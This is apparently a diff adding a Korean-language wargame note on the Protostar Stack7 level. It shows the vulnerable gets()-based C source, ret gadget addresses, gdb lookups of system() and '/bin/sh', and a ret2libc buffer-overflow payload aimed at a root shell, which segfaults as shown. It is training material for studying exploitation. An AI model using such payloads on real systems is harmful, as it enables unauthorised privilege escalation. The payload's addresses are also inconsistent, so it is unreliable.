@@ -434,3 +434,79 @@ id
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 
 ```
+
+### Stack7
+
+> /opt/protostar/bin/stack7
+
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+char *getpath()
+{
+  char buffer[64];
+  unsigned int ret;
+
+  printf("input path please: "); fflush(stdout);
+
+  gets(buffer);
+
+  ret = __builtin_return_address(0);
+
+  if((ret & 0xb0000000) == 0xb0000000) {
+      printf("bzzzt (%p)\n", ret);
+      _exit(1);
+  }
+
+  printf("got path %s\n", buffer);
+  return strdup(buffer);
+}
+
+int main(int argc, char **argv)
+{
+  getpath();
+
+}
+```
+
+알아야하는 것 : *peda*, *ROP*
+
+```
+$ objdump -d /opt/protostar/bin/stack7 | grep ret
+ 8048383: c3                    ret
+ 8048494: c3                    ret
+ 80484c2: c3                    ret
+ 8048544: c3                    ret
+ 8048553: c3                    ret
+ 8048564: c3                    ret
+ 80485c9: c3                    ret
+ 80485cd: c3                    ret
+ 80485f9: c3                    ret
+ 8048617: c3                    ret
+```
+
+```
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
+```
+
+```
+(local)gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0xf7f70bac ("/bin/sh")
+
+```
+
+```
+$ (python -c 'print "A"*80+"\x83\x83\x04\x08"+"\xb0\xff\xec\xb7"+"AAAA"+"\xac\x0b\xf7\xf7"';cat)|./stack7
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA����AAAA�
+                                                                                                                  ��
+Segmentation fault
+
+```
+
+왜 안되는 걸까요...@_@;;
